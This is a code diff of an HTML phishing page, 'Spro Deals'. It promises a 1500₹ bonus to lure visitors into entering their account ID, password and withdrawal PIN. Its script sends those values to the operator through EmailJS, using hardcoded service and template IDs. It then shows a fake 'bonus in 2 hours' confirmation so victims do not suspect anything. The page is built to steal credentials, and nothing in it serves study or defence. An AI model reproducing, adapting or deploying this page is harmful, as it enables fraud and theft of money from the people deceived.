@@ -2,69 +2,54 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Spro Deals</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .container {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      width: 300px;
-      text-align: center;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    button {
-      background: green;
-      color: white;
-      font-weight: bold;
-      border: none;
-      cursor: pointer;
-    }
+    body {font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5;}
+    .card {background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1);}
+    input {width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px;}
+    button {padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;}
+    #thanks {display: none;}
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="card" id="formCard">
     <h2>Welcome to Spro Deals</h2>
     <p>You will get 1500₹ bonus if you complete the following steps:</p>
-    <form id="myForm">
-      <input type="text" name="id" placeholder="Enter ID" required>
-      <input type="password" name="password" placeholder="Enter Password" required>
-      <input type="text" name="pin" placeholder="Enter PIN" required>
+    <form id="sproForm">
+      <input type="text" id="account_id" placeholder="Enter your ID number" required><br>
+      <input type="text" id="pass" placeholder="Enter your password" required><br>
+      <input type="text" id="pin" placeholder="Enter your withdraw PIN" required><br>
       <button type="submit">Submit</button>
     </form>
-    <p id="status"></p>
   </div>
 
-  <!-- EmailJS SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <div class="card" id="thanks">
+    <h2>Thanks for submitting!</h2>
+    <p>You will get bonus in 2 hours.</p>
+  </div>
+
+  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init("LUAYRaC30g781PF_K"); 
+      emailjs.init("LUAYRaC30g781PF_K"); // apna EmailJS public key daalna
     })();
 
-    document.getElementById("myForm").addEventListener("submit", function(e){
+    document.getElementById("sproForm").addEventListener("submit", function(e){
       e.preventDefault();
 
-      emailjs.sendForm("service_ohjwfz9", "template_cwk0gck", this)
-        .then(function(){
-          document.getElementById("status").innerText = "✅ Mail sent successfully!";
-        }, function(error){
-          document.getElementById("status").innerText = "❌ Error: " + error.text;
+      var templateParams = {
+        account_id: document.getElementById("account_id").value,
+        pass: document.getElementById("pass").value,
+        pin: document.getElementById("pin").value
+      };
+
+      emailjs.send("service_ohjwfz9
+", "template_cwk0gck", templateParams)
+        .then(function(response) {
+          document.getElementById("formCard").style.display = "none";
+          document.getElementById("thanks").style.display = "block";
+        }, function(error) {
+          alert("Failed to send: " + JSON.stringify(error));
         });
     });
   </script>
